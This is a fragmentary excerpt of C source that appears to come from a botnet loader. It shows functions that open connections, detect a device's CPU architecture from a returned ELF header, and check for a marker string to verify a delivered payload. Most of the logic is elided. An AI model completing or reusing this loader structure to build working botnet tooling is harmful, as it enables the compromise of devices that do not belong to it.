...
{
    printf("[DEBUG] connection_open: Opening new connection\n");
...
int connection_consume_arch(struct connection *conn)
{
    if(!conn->info.has_arch)
    {
        ...
        if(elf_start_pos > 0)
        {
            ...
            else if(ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64 || ehdr->e_machine == 39)
    ...
    else
    {
        ...
        if(conn->rdbuf_pos > 15360)
        {
            #ifdef DEBUG
                printf("[FD%d] rdbuf_pos > 15360, cleaning buffer\n", conn->fd);
            #endif
            // Clear buffer more aggressively to prevent overflow
            memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
            conn->rdbuf_pos = 0;
        }
    }
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "sp00ky scary skeletons", 22) == -1)
        return offset;
    else
        return 255 + offset;
}
